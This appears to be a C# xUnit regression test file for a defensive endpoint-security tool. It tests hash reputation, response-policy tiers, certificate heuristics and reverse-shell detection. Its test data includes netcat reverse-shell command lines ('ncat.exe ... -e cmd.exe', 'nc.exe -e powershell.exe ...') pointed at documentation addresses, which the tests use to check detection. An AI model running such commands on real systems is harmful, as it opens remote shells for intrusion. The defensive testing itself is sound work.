using System;
using System.Collections.Generic;
using System.Net;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging.Abstractions;
using Sentinel.Core;
using Xunit;

namespace Sentinel.Tests
{
    [Collection("ResponsePolicy")]
    public class Release345RegressionTests
    {
        private sealed class Handler : HttpMessageHandler
        {
            internal readonly List<string> Requests = new();
            internal string Feed = "{\"query_status\":\"ok\",\"data\":[{\"sha256_hash\":\"" + new string('b', 64) + "\"}]}";
            internal string Known = "{}";
            internal HttpStatusCode Status = HttpStatusCode.OK;
            protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
            {
                Requests.Add(request.RequestUri!.AbsoluteUri);
                if (request.RequestUri.AbsoluteUri == OnlineHashReputation.MalwareFeed)
                {
                    Assert.Equal(HttpMethod.Post, request.Method);
                    Assert.Equal("fixture-auth-key", Assert.Single(request.Headers.GetValues("Auth-Key")));
                    Assert.Equal("query=get_recent&selector=100", request.Content!.ReadAsStringAsync().GetAwaiter().GetResult());
                }
                else { Assert.Equal(HttpMethod.Get, request.Method); Assert.Null(request.Content); Assert.False(request.Headers.Contains("Auth-Key")); }
                return Task.FromResult(new HttpResponseMessage(Status) {
                    Content = new StringContent(request.RequestUri.AbsoluteUri == OnlineHashReputation.MalwareFeed ? Feed : Known) });
            }
        }
        [Fact]
        public async Task ExactMalwareMatchWinsOverKnownFileAndSendsNoFileContents()
        {
            var handler = new Handler { Known = "{\"SHA-256\":\"" + new string('b', 64) + "\"}" };
            using var client = new HttpClient(handler);
            using var online = new OnlineHashReputation(client, NullLogger<OnlineHashReputation>.Instance, malwareBazaarApiKey: "fixture-auth-key");
            Assert.Equal(HashVerdict.Unsafe, await online.QueryAsync(new string('b', 64), CancellationToken.None));
            Assert.Single(handler.Requests); // Known-file endpoint cannot override malware.
            Assert.Equal(OnlineHashReputation.MalwareFeed, handler.Requests[0]);
        }
        [Theory]
        [InlineData("<html>blocked</html>", "{}")]
        [InlineData("# empty", "{\"SHA-256\":\"bad\"}")]
        [InlineData("invalid hash", "{\"SHA-256\":12}")]
        [InlineData("", "not json")]
        public async Task UnavailableMalformedAndAbsentEvidenceRemainUnknown(string feed, string known)
        {
            var handler = new Handler { Feed = feed, Known = known };
            using var client = new HttpClient(handler);
            using var online = new OnlineHashReputation(client, NullLogger<OnlineHashReputation>.Instance, malwareBazaarApiKey: "fixture-auth-key");
            Assert.Equal(HashVerdict.Unknown, await online.QueryAsync(new string('a', 64), CancellationToken.None));
        }
        [Fact]
        public async Task ExactKnownFileDoesNotGrantProcessTrustAndFailuresDoNotCreateBadVerdicts()
        {
            string hash = new string('a', 64);
            var handler = new Handler { Known = "{\"SHA-256\":\"" + hash.ToUpperInvariant() + "\"}" };
            using var client = new HttpClient(handler);
            using var online = new OnlineHashReputation(client, NullLogger<OnlineHashReputation>.Instance, malwareBazaarApiKey: "fixture-auth-key");
            Assert.Equal(HashVerdict.Safe, await online.QueryAsync(hash, CancellationToken.None));
            Assert.Equal(HashVerdict.Unknown, await online.QueryAsync("../../payload", CancellationToken.None));
            handler.Status = HttpStatusCode.ServiceUnavailable;
            Assert.Equal(HashVerdict.Unknown, await online.QueryAsync(new string('c', 64), CancellationToken.None));
        }
        [Theory]
        [InlineData("TLS: Root Certificate Requires Review", ResponseAction.RemoveCert)]
        [InlineData("TLS: MitM Planted Root Certificate - Removing", ResponseAction.RemoveCertAndKillAdder)]
        public void CertificateHeuristicsCannotAuthorizeMutationOrAdderKill(string rule, ResponseAction action)
        {
            var signal = new DetectionEvent { RuleName = rule, ProcessId = 4242, Confidence = 1,
                Tier = DetectionTier.Tier1Behavioral, SignalType = SignalType.SecurityEvasion,
                AuthorizedResponse = action, Metadata = new Dictionary<string, string> {
                    ["CertThumbprint"] = "D23209AD23D314232174E40D7F9D62139786633A", ["ChainConfirmed"] = "true" } };
            ResponsePolicy.EnforceDispatchPolicy(signal);
            Assert.Equal(DetectionTier.Tier2Indicator, signal.Tier);
            Assert.Equal(ResponseAction.LogOnly, signal.AuthorizedResponse);
            Assert.Null(signal.Family);
            Assert.True(ResponsePolicy.IsWeakObserveSeed(signal));
        }
        [Fact]
        public void ExplicitDistrustCanRemoveCertificateButCannotKillInferredAdder()
        {
            var signal = new DetectionEvent { ProcessId = 4242, Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.RemoveCertAndKillAdder,
                Metadata = new Dictionary<string, string> { ["CertThumbprint"] = "3E2BF7F2031B96F38CE6C4D8A85D3E2D58476A0F" } };
            ResponsePolicy.EnforceDispatchPolicy(signal);
            Assert.Equal(ResponseAction.RemoveCert, signal.AuthorizedResponse);
            Assert.False(signal.KillAuthorized);
        }
        [Theory]
        [InlineData("UI Overlay: Transparent Fullscreen Overlay Detected", "Overlay", "High")]
        [InlineData("Clickjacking: Suspicious Overlay Window", "Overlay", "High")]
        [InlineData("Privacy: Microphone Usage Record", "Microphone", "Normal")]
        [InlineData("Privacy: Webcam Usage Record", "Camera", "Normal")]
        [InlineData("Input Integrity: Synthetic Keyboard Injection Burst", "Input", "Normal")]
        public void PrivacyHintsRemainSeparateTier2EvenWithForgedTerminalMetadata(string rule, string category, string priority)
        {
            var signal = new DetectionEvent { RuleName = rule, Tier = DetectionTier.Tier1Behavioral, Confidence = 1,
                ProcessId = 4242, Family = TerminalFamily.ReverseShell, AuthorizedResponse = ResponseAction.KillProcessTree,
                Metadata = new Dictionary<string, string> { ["ChainConfirmed"] = "true" } };
            ResponsePolicy.EnforceDispatchPolicy(signal);
            Assert.Equal(DetectionTier.Tier2Indicator, signal.Tier);
            Assert.Equal(ResponseAction.LogOnly, signal.AuthorizedResponse);
            Assert.Null(signal.Family);
            Assert.Equal(category, signal.Metadata!["PrivacyCategory"]);
            Assert.Equal(priority, signal.Metadata["ReviewPriority"]);
            Assert.Equal("Unknown", signal.Metadata["UserInitiated"]);
        }
        [Theory]
        [InlineData("ncat.exe", "ncat.exe 192.0.2.1 443 -e cmd.exe", true)]
        [InlineData("nc.exe", "nc.exe -e powershell.exe 192.0.2.1 4444", true)]
        [InlineData("ncat.exe", "ncat.exe 192.0.2.1 443", false)]
        [InlineData("ncat.exe", "ncat.exe --help -e cmd.exe 192.0.2.1 443", false)]
        [InlineData("ncat.exe", "ncat.exe -l 443 -e cmd.exe", false)]
        [InlineData("ncat.exe", "ncat.exe 127.0.0.1 443 -e cmd.exe", false)]
        [InlineData("powershell.exe", "powershell.exe -c Write-Output '/dev/tcp/192.0.2.1/443'", false)]
        [InlineData("cmd.exe", "cmd.exe /c echo ncat 192.0.2.1 443 -e cmd.exe", false)]
        public void SingleCompleteSocketShellActsImmediatelyWithoutComposite(string host, string command, bool kill)
        {
            var rule = new NanoAvBehaviorRule(new RawSocketRedirectRule());
            var signal = rule.Evaluate(new FusedTelemetryContext { TriggeringEvent = new ProcessTelemetry {
                ProcessId = 4242, ProcessName = host, CommandLine = command } });
            if (!kill) { Assert.Null(signal); return; }
            Assert.NotNull(signal);
            ResponsePolicy.EnforceDispatchPolicy(signal!);
            Assert.Equal(DetectionTier.Tier1Behavioral, signal!.Tier);
            Assert.True(signal.KillAuthorized);
            Assert.False(signal.Metadata!.ContainsKey("ChainConfirmed"));
        }
        [Theory]
        [InlineData(".ocx")][InlineData(".winmd")][InlineData(".psm1")][InlineData(".py")][InlineData(".docm")]
        public void NanoCoverageIncludesNativeScriptsAndMacroDocuments(string extension)
            => Assert.True(NanoAvCoverage.IsScannableExtension(extension));

        [Theory]
        [InlineData("matching", true)]
        [InlineData("reused", false)]
        [InlineData("unattributed", false)]
        [InlineData("weak-network", false)]
        [InlineData("consultant", false)]
        public void PrivacyCompositeRequiresCurrentOwnerAndIndependentTerminalProof(string scenario, bool expected)
        {
            long birth = DateTime.UtcNow.AddMinutes(-1).ToFileTimeUtc();
            var overlay = new DetectionEvent { RuleName = "Clickjacking: Suspicious Overlay Window", ProcessId = 4242,
                Metadata = new Dictionary<string, string> { ["ProcessCreationTime"] = birth.ToString(), ["ActorAttribution"] = "VerifiedWindowOwner" } };
            var attack = new DetectionEvent { RuleName = "Reverse Shell: Raw Socket I/O Redirect", ProcessId = 4242,
                SignalType = SignalType.ReverseShell, Tier = DetectionTier.Tier1Behavioral, Confidence = .95,
                Metadata = new Dictionary<string, string> { ["ProcessCreationTime"] = birth.ToString(), ["BehavioralProof"] = "SocketCommandLoop" } };
            if (scenario == "reused") birth++;
            if (scenario == "unattributed") overlay.Metadata!["ActorAttribution"] = "ForegroundVictim";
            if (scenario == "weak-network") attack.Metadata!.Remove("BehavioralProof");
            if (scenario == "consultant") attack.Metadata!["ConsultantSignal"] = "true";
            Assert.Equal(expected, PrivacyActivityPolicy.HasConfirmedCompromise(new[] { overlay, attack }, birth, DateTime.UtcNow));
        }
        [Theory]
        [InlineData("current", true)] [InlineData("reused", false)] [InlineData("stale", false)]
        [InlineData("future", false)] [InlineData("unknown", false)]
        public void DirectSocketShellCannotKillAReusedPidOrWaitIndefinitelyForProof(string scenario, bool expected)
        {
            var now = DateTime.UtcNow; long birth = now.AddMinutes(-1).ToFileTimeUtc();
            var signal = new DetectionEvent { ProcessId = 4242, Timestamp = now.AddSeconds(-1),
                Metadata = new Dictionary<string, string> { ["ProcessCreationTime"] = birth.ToString() } };
            long live = birth;
            if (scenario == "reused") live++;
            if (scenario == "stale") signal.Timestamp = now.AddSeconds(-31);
            if (scenario == "future") signal.Timestamp = now.AddSeconds(1);
            if (scenario == "unknown") live = 0;
            Assert.Equal(expected, SocketShellLifetime.TryResolve(signal, _ => live, now, out _));
        }
        [Fact]
        public void RouteShapeAndQuantityAreNotAuthorityToDeleteUserVpnRoutes()
        {
            var signal = RouteTableMonitor.CreateRouteObservation("192.0.2.1", "192.0.2.2", 12);
            ResponsePolicy.EnforceDispatchPolicy(signal);
            Assert.Equal(DetectionTier.Tier2Indicator, signal.Tier);
            Assert.Equal(ResponseAction.LogOnly, signal.AuthorizedResponse);
            Assert.Equal("OBSERVED", signal.Metadata!["Action"]);
        }
        [Fact]
        public void PolicyIntegrityChangeCannotBecomeProofOfActiveIpsecOrHostMutation()
        {
            var signal = NetworkPolicyInventoryMonitor.CreateObservation(@"SOFTWARE\Policies\Microsoft\Windows\IPSec");
            ResponsePolicy.EnforceDispatchPolicy(signal);
            Assert.Equal(DetectionTier.Tier2Indicator, signal.Tier);
            Assert.Equal(ResponseAction.LogOnly, signal.AuthorizedResponse);
            Assert.Null(ResponsePolicy.ClassifyTerminalOutcome(signal));
            Assert.Equal("Unproven", signal.Metadata!["ActorAttribution"]);
        }
        [Theory]
        [InlineData("File Reputation: Malicious Binary Executed", false)]
        [InlineData("VerdictGateRule", false)]
        [InlineData("C2 Beaconing Behavior (Statistical)", true)]
        public void CachedReputationAndRegularTimingCannotAuthorizeRuntimeKill(string rule, bool statistical)
        {
            var signal = new DetectionEvent { RuleName = rule, ProcessId = 4242, Tier = DetectionTier.Tier1Behavioral,
                Confidence = 1, SignalType = SignalType.NetworkC2, Family = TerminalFamily.ReverseShell,
                AuthorizedResponse = ResponseAction.KillProcessTree,
                Metadata = new Dictionary<string, string> { ["ChainConfirmed"] = "true" } };
            if (statistical) signal.Metadata["C2StatisticalOnly"] = "true";
            ResponsePolicy.EnforceDispatchPolicy(signal);
            Assert.Equal(DetectionTier.Tier2Indicator, signal.Tier);
            Assert.Equal(ResponseAction.LogOnly, signal.AuthorizedResponse);
            Assert.True(ResponsePolicy.IsNonCorrelatingObserveNoise(signal));
        }
        [Theory]
        [InlineData(@"C:\Windows\WinSxS\component.dll", true)]
        [InlineData(@"C:\Windows\servicing\component.exe", true)]
        [InlineData(@"C:\Users\owner\Downloads\mount\payload.exe", false)]
        [InlineData(@"C:\Users\owner\Downloads\ntlite\payload.exe", false)]
        [InlineData(@"C:\Users\owner\Downloads\Windows\WinSxS\payload.exe", false)]
        [InlineData(@"C:\Windows\Tasks\payload.exe", false)]
        public void AttackerChosenFolderNamesCannotDisableFileCoverage(string path, bool excluded)
            => Assert.Equal(excluded, FileVerdictScanner.IsOsServicingTree(path, @"C:\Windows"));
        [Fact]
        public void RenamedPeContentStillEntersTheRealFileScanner()
        {
            string path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Sentinel345_" + Guid.NewGuid().ToString("N") + ".dat");
            try
            {
                System.IO.File.WriteAllBytes(path, new byte[] { 0x4d, 0x5a, 0, 0 });
                Assert.True(FileVerdictScanner.IsScannable(path));
                System.IO.File.WriteAllText(path, "ordinary data");
                Assert.False(FileVerdictScanner.IsScannable(path));
            }
            finally { System.IO.File.Delete(path); }
        }
        [Theory]
        [InlineData("socket", true)] [InlineData("streaming", false)] [InlineData("reused", false)]
        [InlineData("input-victim", false)] [InlineData("consultant", false)]
        public async Task AgentOverlayCheckNeedsIndependentSupportedShellInThatSameLifetime(string scenario, bool expected)
        {
            long birth = DateTime.UtcNow.AddMinutes(-1).ToFileTimeUtc(); int reads = 0;
            var overlay = new DetectionEvent { ProcessId = 4242, RuleName = "Clickjacking: Suspicious Overlay Window" };
            if (scenario == "input-victim") overlay.RuleName = "Input Integrity: Synthetic Keyboard Injection Burst";
            if (scenario == "consultant") overlay.Metadata = new Dictionary<string, string> { ["ConsultantSignal"] = "true" };
            var inspector = new PrivacyOverlayProofInspector(new RawSocketRedirectRule(), NullLogger<PrivacyOverlayProofInspector>.Instance,
                _ => scenario == "reused" && reads > 0 ? birth + 1 : birth,
                _ => { reads++; return new ProcessTelemetry { ProcessId = 4242, ProcessName = scenario == "streaming" ? "Discord.exe" : "ncat.exe",
                    CommandLine = scenario == "streaming" ? "Discord.exe --type=renderer --stream-game" : "ncat.exe 192.0.2.1 443 -e cmd.exe" }; });
            var proof = await inspector.InspectAsync(overlay, default);
            Assert.Equal(expected, proof != null);
            if (proof != null) { ResponsePolicy.EnforceDispatchPolicy(proof); Assert.True(proof.KillAuthorized); Assert.True(ResponsePolicy.IsDirectSocketShell(proof)); }
            if (scenario == "input-victim" || scenario == "consultant") Assert.Equal(0, reads);
        }
        [Fact]
        public async Task TimedOutOwnerReadsRemainBoundedUntilNativeReadsActuallyReturn()
        {
            using var release = new ManualResetEventSlim(); using var entered = new CountdownEvent(2); using var ended = new CountdownEvent(2);
            using var stop = new CancellationTokenSource(); int reads = 0;
            long birth = DateTime.UtcNow.AddMinutes(-1).ToFileTimeUtc();
            var inspector = new PrivacyOverlayProofInspector(new RawSocketRedirectRule(), NullLogger<PrivacyOverlayProofInspector>.Instance,
                _ => birth, _ => { Interlocked.Increment(ref reads); entered.Signal(); try { release.Wait(TimeSpan.FromSeconds(5)); return null; } finally { ended.Signal(); } });
            DetectionEvent Overlay(int pid) => new() { ProcessId = pid, RuleName = "Clickjacking: Suspicious Overlay Window" };
            var first = inspector.InspectAsync(Overlay(4242), stop.Token);
            var second = inspector.InspectAsync(Overlay(4243), stop.Token);
            try
            {
                Assert.True(entered.Wait(TimeSpan.FromSeconds(3))); stop.Cancel();
                await Assert.ThrowsAnyAsync<OperationCanceledException>(() => first);
                await Assert.ThrowsAnyAsync<OperationCanceledException>(() => second);
                Assert.Null(await inspector.InspectAsync(Overlay(4244), default));
                Assert.Equal(2, reads);
            }
            finally { stop.Cancel(); release.Set(); Assert.True(ended.Wait(TimeSpan.FromSeconds(3))); }
        }
        [Fact]
        public void HomePortDefaultsPreserveGameEgressAndRetireOldBlanketOutboundFilters()
        {
            var active = HardeningModule.PortBlockSpecifications(); var retired = HardeningModule.RetiredOutboundPortBlocks();
            Assert.DoesNotContain(active, r => r.Port == 7777 && r.Direction == 2);
            Assert.Contains(retired, r => r.Port == 7777 && r.Direction == 2);
            Assert.All(active.Where(r => r.Direction == 2), r => Assert.Contains(r.Port, new[] { 137, 138, 139, 445 }));
            Assert.Contains(active, r => r.Port == 445 && r.Direction == 2);
        }
    }
}
